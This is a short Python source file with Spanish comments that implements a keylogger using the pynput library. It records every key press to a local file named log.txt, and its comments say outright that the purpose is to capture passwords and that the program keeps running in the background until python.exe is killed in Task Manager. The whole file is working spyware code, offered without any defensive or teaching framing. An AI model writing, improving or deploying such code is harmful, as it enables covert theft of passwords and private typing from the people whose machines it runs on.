from pynput.keyboard import Listener


def escribirArchivo(key):
    keydata = str(key)
    keydata = keydata.replace("'", "")
    with open("log.txt", "a") as f:
        f.write(keydata)


# Funcion para guardar las contraseñas en el archivo log.txt

with Listener(on_press=escribirArchivo) as l:
    l.join()

# El programa se ejecuta en segundo plano, para cerrarlo se debe hacer desde el Administrador de Tareas, finalizando python.exe
